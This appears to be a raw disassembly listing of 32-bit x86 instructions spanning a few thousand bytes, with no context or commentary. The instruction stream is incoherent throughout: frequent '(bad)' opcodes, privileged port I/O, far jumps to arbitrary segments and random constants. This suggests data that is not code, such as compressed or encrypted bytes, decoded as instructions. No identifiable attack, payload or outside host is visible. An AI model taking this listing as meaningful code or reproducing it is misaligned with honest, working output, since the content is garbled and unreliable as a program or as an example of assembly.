  42464b:	ret    0xf133
  42464e:	inc    ebx
  42464f:	mov    ah,BYTE PTR [esp+ecx*2+0x34]
  424653:	ret    
  424654:	push   es
  424655:	xor    DWORD PTR [ebp-0x5ef68d26],edx
  42465b:	nop
  42465c:	xchg   DWORD PTR [ebx+0x3b904510],eax
  424662:	sbb    DWORD PTR [eax+0x65fbb8a2],ebp
  424668:	fist   WORD PTR [ebp+0x499956c0]
  42466e:	out    dx,eax
  42466f:	pop    ebp
  424670:	pop    eax
  424671:	ret    
  424672:	std    
  424673:	mul    DWORD PTR [eax]
  424675:	push   ss
  424676:	inc    esp
  424677:	push   edi
  424678:	xor    al,BYTE PTR [eax+0x5b7517bc]
  42467e:	out    0x87,al
  424680:	daa    
  424681:	push   es
  424682:	pop    esi
  424683:	rep outs dx,BYTE PTR ds:[esi]
  424685:	push   eax
  424686:	xchg   ebp,eax
  424687:	aas    
  424688:	push   edi
  424689:	into   
  42468a:	pminsw mm3,QWORD PTR [edx-0x12]
  42468e:	mov    esi,0x91505957
  424693:	aam    0xc9
  424695:	cmp    al,0x86
  424697:	adc    edx,DWORD PTR [ebx-0x47]
  42469a:	sub    BYTE PTR [eax+0x17],dl
  42469d:	jmp    0x64fa:0x35d80d57
  4246a4:	jecxz  0x424626
  4246a6:	call   0x5f3c5e3a
  4246ab:	or     eax,0xbebcda60
  4246b0:	xor    dh,bl
  4246b2:	add    BYTE PTR [edx+0x52],dh
  4246b5:	out    dx,al
  4246b6:	push   ss
  4246b7:	iret   
  4246b8:	cmp    al,0xa6
  4246ba:	gs daa 
  4246bc:	xchg   ecx,eax
  4246bd:	pop    edi
  4246be:	inc    ebx
  4246bf:	jmp    0x407c:0x8e547f45
  4246c6:	mov    eax,0x61d2c49a
  4246cb:	push   esp
  4246cc:	mov    bl,0xf6
  4246ce:	nop
  4246cf:	sbb    ch,BYTE PTR [eax]
  4246d1:	xor    ebx,DWORD PTR [ecx+0x61ac8050]
  4246d7:	ror    DWORD PTR es:[edx+0x5d66a48d],0x3b
  4246df:	or     BYTE PTR [eax+eax*8+0x1c03d7cf],bl
  4246e6:	mov    bl,0xd8
  4246e8:	mov    ebp,0xdd880e17
  4246ed:	sub    esi,esi
  4246ef:	xchg   edi,eax
  4246f0:	or     ah,BYTE PTR [ecx-0x7bd0ed82]
  4246f6:	jnp    0x4246a8
  4246f8:	popf   
  4246f9:	sbb    cl,dl
  4246fb:	mov    DWORD PTR ds:0xbfabddee,esi
  424701:	mov    ss,WORD PTR [ecx-0x6e5e7b22]
  424707:	or     DWORD PTR [esi+0x6152c832],edx
  42470d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42470e:	icebp  
  42470f:	sub    dl,BYTE PTR [eax+0x72]
  424712:	xchg   esp,eax
  424713:	leave  
  424714:	(bad)  
  424715:	lock sbb ebx,DWORD PTR [esi]
  424718:	aad    0xf3
  42471a:	or     al,0x89
  42471c:	sahf   
  42471d:	pop    ebx
  42471e:	or     dl,BYTE PTR [esi+0x7]
  424721:	mov    bh,0x4e
  424723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424724:	scas   eax,DWORD PTR es:[edi]
  424725:	push   esi
  424726:	and    eax,0x22db0249
  42472b:	lock mov eax,ds:0xee545d80
  424731:	std    
  424732:	pop    ss
  424733:	xchg   edi,eax
  424734:	jle    0x424729
  424736:	cmp    BYTE PTR [ecx-0xab29f2a],bh
  42473c:	adc    al,0x15
  42473e:	out    0xea,eax
  424740:	xchg   BYTE PTR [edi],ah
  424742:	call   0xf124:0x154625ea
  424749:	fldenv [ebx+0x7]
  42474c:	xchg   DWORD PTR [ebx],ebx
  42474e:	jl     0x424761
  424750:	cmc    
  424751:	pusha  
  424752:	enter  0xe813,0x66
  424756:	push   ds
  424757:	mul    DWORD PTR [esi+0x129e932e]
  42475d:	inc    ebx
  42475e:	into   
  42475f:	retf   
  424760:	(bad)  
  424761:	out    0xd2,eax
  424763:	sub    al,0xb
  424765:	jns    0x4247cb
  424767:	out    0x4,al
  424769:	mov    DWORD PTR [eax],esi
  42476b:	xchg   DWORD PTR [ebx-0x1fbe3750],eax
  424771:	das    
  424772:	ins    BYTE PTR es:[edi],dx
  424773:	test   al,0xc2
  424775:	cmp    edx,DWORD PTR [eax]
  424777:	fcmovnbe st,st(2)
  424779:	inc    edi
  42477a:	pop    ss
  42477b:	inc    eax
  42477c:	shl    BYTE PTR [edx+0x3c33cc77],1
  424782:	aam    0xfb
  424784:	sub    BYTE PTR [ebx-0x65727a73],bh
  42478a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42478b:	jnp    0x4247e3
  42478d:	das    
  42478e:	inc    ecx
  42478f:	js     0x42479e
  424791:	cmp    esi,ebx
  424793:	xor    ebp,ebp
  424795:	inc    edx
  424796:	xchg   esp,eax
  424797:	mov    ebp,0xe23a384f
  42479c:	adc    al,0x6f
  42479e:	and    eax,0x5c239d92
  4247a3:	xlat   BYTE PTR ds:[ebx]
  4247a4:	xchg   edx,eax
  4247a5:	xchg   BYTE PTR [edi-0x42],bh
  4247a8:	call   0xb38d:0xdc32d5a4
  4247af:	stos   BYTE PTR es:[edi],al
  4247b0:	div    BYTE PTR [ebp+0x3a]
  4247b3:	clc    
  4247b4:	fisttp QWORD PTR [ecx+0x2e]
  4247b7:	mov    edi,0x19d82b90
  4247bc:	mov    DWORD PTR [ebx],0xb4e20392
  4247c2:	stos   BYTE PTR es:[edi],al
  4247c3:	in     eax,dx
  4247c4:	push   eax
  4247c5:	push   ds
  4247c6:	mov    bl,0x4c
  4247c8:	lea    ebp,[esi-0x11]
  4247cb:	rcr    DWORD PTR [ecx-0x18],cl
  4247ce:	imul   eax,DWORD PTR ds:0x59f05602,0xe8125cf1
  4247d8:	scas   eax,DWORD PTR es:[edi]
  4247d9:	ret    
  4247da:	push   ebx
  4247db:	adc    DWORD PTR [edi],esp
  4247dd:	out    0x46,eax
  4247df:	cmp    ebp,DWORD PTR [ebp-0x48]
  4247e2:	jecxz  0x4247f3
  4247e4:	addr16 dec ecx
  4247e6:	sbb    BYTE PTR [ecx+0x79b58ff3],dl
  4247ec:	xlat   BYTE PTR ds:[ebx]
  4247ed:	es mov dl,0x22
  4247f0:	in     eax,dx
  4247f1:	cdq    
  4247f2:	mov    ?,WORD PTR [ecx+eiz*8+0x3a]
  4247f6:	push   ecx
  4247f7:	ror    BYTE PTR [ebx-0x7fb6eec8],cl
  4247fd:	adc    eax,0x25215d37
  424802:	inc    esp
  424803:	dec    eax
  424804:	test   al,0x46
  424806:	shl    BYTE PTR [edi-0x2e90e3b6],1
  42480c:	xor    al,0x37
  42480e:	mov    ebx,0x928937e3
  424813:	(bad)  
  424814:	adc    eax,0xd822fe13
  424819:	lock jae 0x42481c
  42481c:	sub    ebp,DWORD PTR [edi+0x7c]
  42481f:	adc    al,0x6
  424821:	jo     0x4247ca
  424823:	add    eax,0x6f9e99cb
  424828:	mov    al,ds:0xc41d8d65
  42482d:	cmp    ebx,DWORD PTR [ecx-0x5e]
  424830:	jg     0x424859
  424832:	push   0x25
  424834:	push   0x5b
  424836:	push   edi
  424837:	mov    eax,0xf8357a10
  42483c:	pop    ecx
  42483d:	sub    al,0xb8
  42483f:	ret    0xf631
  424842:	xchg   ebp,eax
  424843:	pop    esi
  424844:	test   DWORD PTR [esi+0xf],esi
  424847:	pop    eax
  424848:	enter  0x5d21,0x4
  42484c:	and    eax,0x81a3d53c
  424851:	rol    DWORD PTR [bp+di-0x22],1
  424855:	mov    al,0x11
  424857:	or     DWORD PTR [ebx+eiz*2+0x11],0x3a
  42485c:	jb     0x42484c
  42485e:	pop    eax
  42485f:	shr    BYTE PTR [edi+edx*8-0x80],0xe8
  424864:	cli    
  424865:	stc    
  424866:	leave  
  424867:	mov    ds:0x30f6d703,eax
  42486c:	xchg   edx,eax
  42486d:	hlt    
  42486e:	(bad)  
  42486f:	dec    ecx
  424870:	js     0x424821
  424872:	mov    dl,0xd9
  424874:	jmp    0xf4d70de5
  424879:	ret    
  42487a:	lock and DWORD PTR [ebx],edi
  42487d:	adc    BYTE PTR [bx+0x5c],cl
  424881:	pushf  
  424882:	fnstsw WORD PTR [edi]
  424884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424885:	jne    0x4248da
  424887:	inc    ecx
  424888:	sub    edi,DWORD PTR [ebx+esi*4]
  42488b:	sub    ebp,esi
  42488d:	mov    al,ds:0x9604e3b5
  424892:	js     0x424866
  424894:	pop    ds
  424895:	ficom  WORD PTR [ebp+0x425ea23f]
  42489b:	push   ecx
  42489c:	dec    ebp
  42489d:	pop    es
  42489e:	dec    ebx
  42489f:	xor    bl,al
  4248a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248a2:	jge    0x4248b8
  4248a4:	pusha  
  4248a5:	adc    eax,DWORD PTR [edi]
  4248a7:	sub    al,0xfa
  4248a9:	jl     0x4248d0
  4248ab:	test   al,0xbb
  4248ad:	cmp    cl,BYTE PTR [eax+ebx*8]
  4248b0:	xor    BYTE PTR [esi+0x2099a230],bh
  4248b6:	and    BYTE PTR [edx+ebx*2+0x7600bd92],cl
  4248bd:	out    0x56,eax
  4248bf:	sbb    al,0xfb
  4248c1:	or     eax,0xca81cba2
  4248c6:	loop   0x42488a
  4248c8:	sbb    BYTE PTR [ecx],0x88
  4248cb:	xchg   edx,eax
  4248cc:	mov    dl,0xdb
  4248ce:	push   edx
  4248cf:	outs   dx,BYTE PTR ds:[esi]
  4248d0:	lock dec ebp
  4248d2:	or     al,BYTE PTR [edx-0x1f]
  4248d5:	stos   DWORD PTR es:[edi],eax
  4248d6:	shl    DWORD PTR [ecx+edi*1-0x60],0x38
  4248db:	ja     0x4248e0
  4248dd:	jns    0x424887
  4248df:	and    cl,0x5b
  4248e2:	mov    ah,0x5e
  4248e4:	mov    ds:0x6655ea77,al
  4248e9:	imul   ebp,ebp,0x9eb26ad8
  4248ef:	stc    
  4248f0:	jg     0x42487f
  4248f2:	push   ecx
  4248f3:	test   al,0xcb
  4248f5:	pop    es
  4248f6:	scas   eax,DWORD PTR es:[edi]
  4248f7:	sahf   
  4248f8:	leave  
  4248f9:	div    esp
  4248fb:	es clc 
  4248fd:	mov    ah,0x4a
  4248ff:	popf   
  424900:	aam    0x28
  424902:	lock mov dh,0x70
  424905:	rcr    BYTE PTR [edx],cl
  424907:	xor    esi,DWORD PTR [ebx-0x74]
  42490a:	test   BYTE PTR [edx+0x3bbcbeff],bl
  424910:	cmp    al,0x9e
  424912:	(bad)  
  424913:	xchg   ebx,eax
  424914:	pop    ds
  424915:	dec    ebx
  424916:	test   BYTE PTR [ebx-0x22],al
  424919:	xor    ch,BYTE PTR [ebp+0x7c5ce661]
  42491f:	shl    DWORD PTR [edx+0x19],cl
  424922:	adc    ebp,ecx
  424924:	ficomp DWORD PTR [edx]
  424926:	jge    0x424901
  424928:	pop    eax
  424929:	cmp    ebp,ecx
  42492b:	push   esp
  42492c:	cs out dx,eax
  42492e:	cmc    
  42492f:	push   ds
  424930:	retf   
  424931:	pop    esp
  424932:	xor    al,0x52
  424934:	sar    ebp,1
  424936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424937:	test   eax,0xd91c7be8
  42493c:	adc    al,al
  42493e:	pop    ds
  42493f:	inc    edi
  424940:	dec    edx
  424941:	aam    0x81
  424943:	ins    DWORD PTR es:[edi],dx
  424944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424945:	jns    0x42491e
  424947:	retf   
  424948:	sbb    DWORD PTR [ebx-0x5b],ebp
  42494b:	(bad)  
  42494c:	jp     0x424995
  42494e:	mov    dl,0x1f
  424950:	iret   
  424951:	fistp  WORD PTR [edi+ecx*1-0x4b]
  424955:	sub    BYTE PTR [eax+0x60],dl
  424958:	mov    esi,0x8e8ba588
  42495d:	mov    DWORD PTR [esi],esi
  42495f:	inc    esp
  424960:	mov    dh,0xf0
  424962:	fdivr  DWORD PTR [edi+0x65]
  424965:	ret    
  424966:	jle    0x424900
  424968:	mov    eax,0xb534d181
  42496d:	and    ch,BYTE PTR [eax+0x1b]
  424970:	push   eax
  424971:	imul   DWORD PTR [edi+0x23]
  424974:	xor    al,0x4b
  424976:	xabort 0xae
  424979:	sub    ch,dh
  42497b:	cmp    bl,ah
  42497d:	xor    al,0xf
  42497f:	gs push eax
  424981:	not    dh
  424983:	repz mov ah,BYTE PTR [ebp+0xd]
  424987:	add    BYTE PTR [eax],dh
  424989:	add    BYTE PTR [eax+edi*4+0x79],bh
  42498d:	retf   0xc3e5
  424990:	jmp    0xb730:0xe10fc84d
  424997:	xchg   DWORD PTR [ecx-0x69],ecx
  42499a:	jne    0x424a16
  42499c:	cmp    DWORD PTR fs:[ebp+0x18931595],ebx
  4249a3:	scas   eax,DWORD PTR es:[edi]
  4249a4:	fistp  DWORD PTR [eax+ebp*1+0x5f]
  4249a8:	adc    al,0xc4
  4249aa:	ins    BYTE PTR es:[edi],dx
  4249ab:	dec    ebp
  4249ac:	jg     0x424969
  4249ae:	jnp    0x4249a1
  4249b0:	into   
  4249b1:	outs   dx,DWORD PTR ss:[esi]
  4249b3:	mov    ch,0xc6
  4249b5:	retf   
  4249b6:	or     bh,BYTE PTR [esi]
  4249b8:	repnz retf 
  4249ba:	aad    0xd4
  4249bc:	xor    eax,0x4dfba8b5
  4249c1:	aad    0xa6
  4249c3:	mov    ah,BYTE PTR [ebx+0x19464f6a]
  4249c9:	rol    DWORD PTR [esi+0x56b4af32],1
  4249cf:	outs   dx,BYTE PTR ds:[esi]
  4249d0:	or     al,0x21
  4249d2:	dec    esi
  4249d3:	mov    eax,0x9d6f8401
  4249d8:	out    0x90,al
  4249da:	add    al,ch
  4249dc:	push   ebx
  4249dd:	or     al,BYTE PTR ss:[ecx+0x66]
  4249e1:	stos   DWORD PTR es:[edi],eax
  4249e2:	imul   ecx,ecx,0xd5e70f0b
  4249e8:	and    al,0x39
  4249ea:	(bad)  
  4249eb:	fcmove st,st(3)
  4249ed:	aas    
  4249ee:	out    dx,eax
  4249ef:	and    DWORD PTR [edi],esi
  4249f1:	sub    bl,ah
  4249f3:	fdiv   st(5),st
  4249f5:	imul   ebx,DWORD PTR [edi+0x4c],0xdb16da75
  4249fc:	jmp    0x38c448b5
  424a01:	pop    edi
  424a02:	mov    ebp,0x9e4d07a9
  424a07:	mov    edx,0x3bdd8488
  424a0c:	mov    ds:0x6059e152,eax
  424a11:	(bad)  
  424a12:	test   eax,0x5f041bed
  424a17:	sub    ebp,DWORD PTR [eax+ecx*2-0x62]
  424a1b:	into   
  424a1c:	aad    0xee
  424a1e:	dec    ebp
  424a1f:	jle    0x424a9e
  424a21:	outs   dx,DWORD PTR ds:[esi]
  424a22:	jmp    0x2a01:0xea761c2d
  424a29:	fstp   TBYTE PTR [edi]
  424a2b:	stos   DWORD PTR es:[edi],eax
  424a2c:	push   esi
  424a2d:	test   BYTE PTR [esi],ah
  424a2f:	nop
  424a30:	nop
  424a31:	fisubr DWORD PTR [edi]
  424a33:	mov    bh,0xec
  424a35:	(bad)  [ecx+eiz*4+0x57]
  424a3a:	mov    ss,WORD PTR [ebx]
  424a3c:	icebp  
  424a3d:	jg     0x424a88
  424a3f:	push   ebp
  424a40:	push   cs
  424a41:	(bad)  
  424a42:	retf   
  424a43:	outs   dx,DWORD PTR ds:[esi]
  424a44:	out    0xb5,eax
  424a46:	popf   
  424a47:	cdq    
  424a48:	add    al,0x33
  424a4a:	cwde   
  424a4b:	push   ebp
  424a4c:	pusha  
  424a4d:	mov    esi,0x19fe0c24
  424a52:	into   
  424a53:	fstp   DWORD PTR [esi]
  424a55:	mov    edi,0x20c0782d
  424a5a:	add    ah,dl
  424a5c:	jne    0x424a6e
  424a5e:	cmp    eax,0xd9b87a7c
  424a63:	jmp    0x7e8c:0x4aa455ae
  424a6a:	fldenv [ebx+0x53]
  424a6d:	out    0xfe,eax
  424a6f:	jp     0x424ada
  424a71:	sbb    edi,DWORD PTR [ebx]
  424a73:	ins    BYTE PTR es:[edi],dx
  424a74:	aaa    
  424a75:	repnz idiv DWORD PTR [ecx+0x75]
  424a79:	inc    ebx
  424a7a:	and    BYTE PTR [ebx+0x4d9514e9],ah
  424a80:	mov    bl,0xc5
  424a82:	cmp    BYTE PTR [edi+edx*1],ah
  424a85:	and    eax,0xd8eae6e8
  424a8a:	push   eax
  424a8b:	outs   dx,DWORD PTR ds:[esi]
  424a8c:	stos   BYTE PTR es:[edi],al
  424a8d:	enter  0xd3a7,0xe4
  424a91:	jb     0x424a68
  424a93:	mul    BYTE PTR [edx]
  424a95:	ins    BYTE PTR es:[edi],dx
  424a96:	ins    BYTE PTR es:[edi],dx
  424a97:	or     ecx,eax
  424a99:	push   esi
  424a9a:	cmp    cl,dl
  424a9c:	pop    ss
  424a9d:	out    0xa5,al
  424a9f:	and    al,0x2e
  424aa1:	push   esi
  424aa2:	loopne 0x424b13
  424aa4:	xchg   esi,eax
  424aa5:	sub    BYTE PTR [esi+0x7d],bl
  424aa8:	mov    al,0xe1
  424aaa:	xchg   edi,eax
  424aab:	ins    BYTE PTR es:[edi],dx
  424aac:	test   al,0xd1
  424aae:	inc    ebx
  424aaf:	aas    
  424ab0:	or     al,0xb9
  424ab2:	inc    ebp
  424ab3:	lea    edx,[edx+0xc372c5f]
  424ab9:	div    BYTE PTR [edi-0x3edddd09]
  424abf:	test   DWORD PTR [edx-0x2e],edi
  424ac2:	sub    al,0x37
  424ac4:	or     al,0xdd
  424ac6:	mov    ebp,eax
  424ac8:	mov    dh,0x99
  424aca:	popf   
  424acb:	stos   DWORD PTR es:[edi],eax
  424acc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424acd:	jbe    0x424aaf
  424acf:	mov    eax,ds:0x1060a96e
  424ad4:	stc    
  424ad5:	out    dx,al
  424ad6:	outs   dx,BYTE PTR ds:[esi]
  424ad7:	push   eax
  424ad8:	call   0x37506857
  424add:	jl     0x424aa3
  424adf:	or     BYTE PTR [edi+0x7b],dh
  424ae2:	pop    DWORD PTR [eax+0x7]
  424ae5:	add    al,0x1e
  424ae7:	add    esp,DWORD PTR [esi]
  424ae9:	jns    0x424b5e
  424aeb:	xchg   BYTE PTR [edi-0x4c],bl
  424aee:	adc    esp,eax
  424af0:	mov    cl,0x76
  424af2:	adc    DWORD PTR [ecx-0x2e7012c8],ebx
  424af8:	xchg   esi,eax
  424af9:	mov    edi,0xaef7d489
  424afe:	stos   DWORD PTR es:[edi],eax
  424aff:	add    al,0xcb
  424b01:	jmp    0xd191:0x61f8a413
  424b08:	mov    bl,BYTE PTR [edx-0x11a73e51]
  424b0e:	popa   
  424b0f:	xchg   ebx,eax
  424b10:	jbe    0x424ae9
  424b12:	jns    0x424b0e
  424b14:	and    esi,DWORD PTR ds:0xa9860147
  424b1a:	(bad)  [ebx+ebp*4]
  424b1d:	push   ds
  424b1e:	sar    DWORD PTR [ecx],cl
  424b20:	sbb    cl,dl
  424b22:	adc    ah,BYTE PTR [ebx+0x1e]
  424b25:	pop    es
  424b26:	push   DWORD PTR [ecx-0x123a3e64]
  424b2c:	cmp    eax,0xc9349d78
  424b31:	sbb    bl,BYTE PTR [ecx-0x1f]
  424b34:	retf   
  424b35:	add    bh,BYTE PTR [esi+0x5d]
  424b38:	in     al,0x40
  424b3a:	imul   ecx,DWORD PTR [ebx-0x5e],0x74771a9b
  424b41:	jmp    0x424b42
  424b43:	pop    edi
  424b44:	sbb    BYTE PTR ds:0xe6bb156c,cl
  424b4a:	popf   
  424b4b:	ss xor eax,0x548eee8d
  424b51:	pop    ebx
  424b52:	push   ebx
  424b53:	scas   eax,DWORD PTR es:[edi]
  424b54:	(bad)  
  424b56:	aad    0x82
  424b58:	dec    esi
  424b59:	inc    edx
  424b5a:	ffree  st(4)
  424b5c:	cli    
  424b5d:	mov    esp,0x89baa3ed
  424b62:	les    edi,FWORD PTR [edx-0x5]
  424b65:	jl     0x424b44
  424b67:	mov    dl,0xb6
  424b69:	or     al,0xf1
  424b6b:	inc    esp
  424b6c:	or     bl,BYTE PTR [edi]
  424b6e:	shr    eax,1
  424b70:	imul   esp,DWORD PTR [edx],0x7fe315e7
  424b76:	dec    ebx
  424b77:	mov    esp,0xfd48e106
  424b7c:	push   ecx
  424b7d:	out    dx,al
  424b7e:	(bad)  
  424b80:	mov    BYTE PTR [eax],0x71
  424b83:	iret   
  424b84:	in     al,dx
  424b85:	xchg   edi,eax
  424b86:	sbb    al,0xb2
  424b88:	inc    esi
  424b89:	fdivr  QWORD PTR [edi+0x15]
  424b8c:	bound  esi,QWORD PTR [ebx+0x67e444f1]
  424b92:	xor    esp,ebp
  424b94:	push   0xd9a86c73
  424b99:	ss dec ebp
  424b9b:	cmp    eax,0xa3d16233
  424ba0:	dec    esi
  424ba1:	inc    esi
  424ba2:	xchg   edx,eax
  424ba3:	mov    dl,0x82
  424ba5:	aad    0x51
  424ba7:	push   ebp
  424ba8:	and    al,0x56
  424baa:	mov    ch,0xd2
  424bac:	lds    edi,FWORD PTR [ecx]
  424bae:	gs push esi
  424bb0:	xchg   ecx,eax
  424bb1:	pop    ebp
  424bb2:	shl    ebx,cl
  424bb4:	mov    WORD PTR [edi],es
  424bb6:	inc    esp
  424bb7:	xchg   ecx,eax
  424bb8:	aam    0x73
  424bba:	mov    ch,dl
  424bbc:	bound  ebx,QWORD PTR [eax-0x5b39c674]
  424bc2:	gs pop ecx
  424bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424bc5:	repz std 
  424bc7:	sub    BYTE PTR [eax+ebp*2-0xcb34349],cl
  424bce:	rcl    BYTE PTR [edx+eiz*8],cl
  424bd1:	shr    DWORD PTR [esi],0x56
  424bd4:	dec    ecx
  424bd5:	cdq    
  424bd6:	push   edx
  424bd7:	imul   esi,DWORD PTR [edi+0x39],0x45
  424bdb:	bnd jmp 0x424b74
  424bde:	(bad)  
  424be0:	jns    0x424b67
  424be2:	mov    bl,0xf7
  424be4:	xchg   edx,eax
  424be5:	xchg   esp,eax
  424be6:	call   0x3e06c63
  424beb:	pop    ecx
  424bec:	pusha  
  424bed:	push   edx
  424bee:	cmp    al,0x4a
  424bf0:	jno    0x424c69
  424bf2:	mov    edi,0x5921c744
  424bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bf8:	les    esp,FWORD PTR [ebp+0x3228fd97]
  424bfe:	imul   esp,esi,0xffffffc4
  424c01:	addr16 in al,dx
  424c03:	mov    edi,edi
  424c05:	inc    edi
  424c06:	cmp    eax,0x883c60b3
  424c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c0c:	mov    eax,ecx
  424c0e:	sahf   
  424c0f:	scas   eax,DWORD PTR es:[edi]
  424c10:	and    al,0x22
  424c12:	or     DWORD PTR [ebx],ebx
  424c14:	cmp    DWORD PTR [ebx+0x39],0x58
  424c18:	fiadd  WORD PTR [ecx]
  424c1a:	repnz pop ecx
  424c1c:	stos   DWORD PTR es:[edi],eax
  424c1d:	jae    0x424bc3
  424c1f:	dec    ebp
  424c20:	aad    0x56
  424c22:	or     al,0x22
  424c24:	sbb    al,0x9c
  424c26:	cld    
  424c27:	in     al,0xa0
  424c29:	and    edx,DWORD PTR [edx]
  424c2b:	sahf   
  424c2c:	in     eax,dx
  424c2d:	hlt    
  424c2e:	xlat   BYTE PTR ds:[ebx]
  424c2f:	pop    ss
  424c30:	xor    al,BYTE PTR [ebp-0x3658adcb]
  424c36:	fst    QWORD PTR [ebx]
  424c38:	mov    ebx,0xaf165169
  424c3d:	stos   BYTE PTR es:[edi],al
  424c3e:	aas    
  424c3f:	(bad)  
  424c40:	stc    
  424c41:	jae    0x424c81
  424c43:	xchg   edx,eax
  424c44:	pop    ebp
  424c45:	test   al,0x69
  424c47:	mov    dl,BYTE PTR [ebp-0x23]
  424c4a:	dec    ebx
  424c4b:	mov    dl,0x43
  424c4d:	or     eax,0x3110dfe9
  424c52:	xchg   ebp,eax
  424c53:	and    al,0xad
  424c55:	cli    
  424c56:	daa    
  424c57:	adc    ebp,esi
  424c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c5a:	call   0x1c51:0x8c75e6b4
  424c61:	ror    BYTE PTR [ebp+0x52],cl
  424c64:	popf   
  424c65:	sbb    ecx,DWORD PTR [ebp+0x28000aa5]
  424c6b:	mov    esp,0x331be6da
  424c70:	jbe    0x424c23
  424c72:	add    DWORD PTR [ecx],0x1104120
  424c78:	jge    0x424c44
  424c7a:	sahf   
  424c7b:	pop    es
  424c7c:	or     eax,0x7946596a
  424c81:	clc    
  424c82:	mov    edi,0x4241cc09
  424c87:	xchg   edi,eax
  424c88:	int    0x2
  424c8a:	or     eax,0x28f5b4f
  424c8f:	add    ah,BYTE PTR [ebp-0x20]
  424c92:	adc    BYTE PTR [ecx+eiz*8+0x744a7f01],al
  424c99:	push   esp
  424c9a:	add    DWORD PTR [esi+ebx*1+0x5fdf9e5f],0x74
  424ca2:	loop   0x424c8e
  424ca4:	icebp  
  424ca5:	fs (bad) 
  424ca7:	(bad)  
  424ca8:	mov    ah,0x6a
  424caa:	not    DWORD PTR [ebx-0x7e01f050]
  424cb0:	retf   0x9af5
  424cb3:	js     0x424c7c
  424cb5:	cwde   
  424cb6:	and    BYTE PTR [edi],ch
  424cb8:	cmp    ebp,ecx
  424cba:	xor    al,0xc8
  424cbc:	in     eax,0x88
  424cbe:	stc    
  424cbf:	lods   eax,DWORD PTR ds:[esi]
  424cc0:	jge    0x424c81
  424cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cc3:	stos   BYTE PTR es:[edi],al
  424cc4:	dec    esp
  424cc5:	fild   DWORD PTR [ecx-0x54]
  424cc8:	push   ebx
  424cc9:	das    
  424cca:	jp     0x424c6f
  424ccc:	or     eax,0x5c27d7e9
  424cd1:	scas   al,BYTE PTR es:[edi]
  424cd2:	inc    ecx
  424cd3:	lea    eax,ds:0xebd3ebfe
  424cd9:	cli    
  424cda:	ins    DWORD PTR es:[edi],dx
  424cdb:	add    al,BYTE PTR [edi]
  424cdd:	xor    BYTE PTR [ebx-0x5f5e6512],ch
  424ce3:	aaa    
  424ce4:	sbb    BYTE PTR [ebx],ch
  424ce6:	jl     0x424cc3
  424ce8:	and    al,BYTE PTR [ebp+0x5a01dd0e]
  424cee:	sbb    cl,BYTE PTR [ebp-0x481bb2ec]
  424cf4:	popa   
  424cf5:	in     al,dx
  424cf6:	fistp  QWORD PTR [ebp-0x72f9ba9c]
  424cfc:	push   cs
  424cfd:	js     0x424d1e
  424cff:	fdivr  st(0),st
  424d01:	xor    bl,BYTE PTR [ecx-0x14]
  424d04:	sbb    al,0x3
  424d06:	jne    0x424cce
  424d08:	pop    es
  424d09:	test   al,0x44
  424d0b:	(bad)  
  424d0c:	call   0xf8f:0xe651a163
  424d13:	(bad)  
  424d14:	inc    esp
  424d15:	cli    
  424d16:	inc    eax
  424d17:	xchg   edi,eax
  424d18:	pop    ebp
  424d19:	addr16 sbb eax,0xfa9eff37
  424d1f:	fild   WORD PTR [edi]
  424d21:	mov    dl,0x2
  424d23:	int3   
  424d24:	rol    edi,0x8f
  424d27:	test   al,0xf
  424d29:	sbb    DWORD PTR [ecx+0x3e],esi
  424d2c:	ret    
  424d2d:	jge    0x424d45
  424d2f:	jle    0x424dac
  424d31:	xor    DWORD PTR [ebp-0x28bd5e66],edx
  424d37:	mov    dl,0x9b
  424d39:	sub    BYTE PTR [ebx+0x257d88a3],dl
  424d3f:	aas    
  424d40:	outs   dx,BYTE PTR ds:[esi]
  424d41:	sbb    cl,dl
  424d43:	jnp    0x424cfd
  424d45:	ror    dh,cl
  424d47:	inc    edi
  424d48:	pop    es
  424d49:	lods   al,BYTE PTR ds:[esi]
  424d4a:	fnstenv [edx+0x3dd367b5]
  424d50:	jo     0x424cf4
  424d52:	adc    dl,ah
  424d54:	sub    esi,DWORD PTR [esi]
  424d56:	into   
  424d57:	jae    0x424cfe
  424d59:	out    dx,eax
  424d5a:	mov    dh,0xf2
  424d5c:	dec    ebx
  424d5d:	push   0xfffffff8
  424d5f:	mov    edi,0x1c265312
  424d64:	out    dx,eax
  424d65:	dec    ebp
  424d66:	push   eax
  424d67:	inc    ebx
  424d68:	sbb    al,0x3f
  424d6a:	pop    edi
  424d6b:	mov    ebx,0xe28f2ae3
  424d70:	nop
  424d71:	adc    BYTE PTR [edi],dl
  424d73:	jge    0x424d83
  424d75:	or     ebp,esi
  424d77:	jge    0x424cff
  424d79:	mov    cl,0xe1
  424d7b:	sub    eax,0x702c01d8
  424d80:	push   esp
  424d81:	cmp    dl,BYTE PTR [ebp-0x42ccc199]
  424d87:	cmp    BYTE PTR [ebp-0xd30fa52],bh
  424d8d:	xor    eax,0x9cc07a27
  424d92:	cmp    DWORD PTR [esi+eiz*2-0x17371827],0x27
  424d9a:	(bad)  
  424d9b:	daa    
  424d9c:	inc    ecx
  424d9d:	fs jns 0x424dfc
  424da0:	mov    dl,0x8
  424da2:	xor    al,0x74
  424da4:	sbb    ah,BYTE PTR [ebp+ecx*8-0x6bdfa005]
  424dab:	imul   ecx,edi,0x71
  424dae:	sbb    edi,DWORD PTR [eax]
  424db0:	fs (bad) 
  424db2:	mov    dh,BYTE PTR [esi]
  424db4:	in     eax,0xb
  424db6:	inc    edx
  424db7:	test   ch,bh
  424db9:	mov    cl,0xc3
  424dbb:	sbb    dh,BYTE PTR [edi]
  424dbd:	add    bh,BYTE PTR [ebx+ecx*1]
  424dc0:	cld    
  424dc1:	pop    edi
  424dc2:	test   BYTE PTR [eax+ebx*8-0x4affc1e1],0xa9
  424dca:	clc    
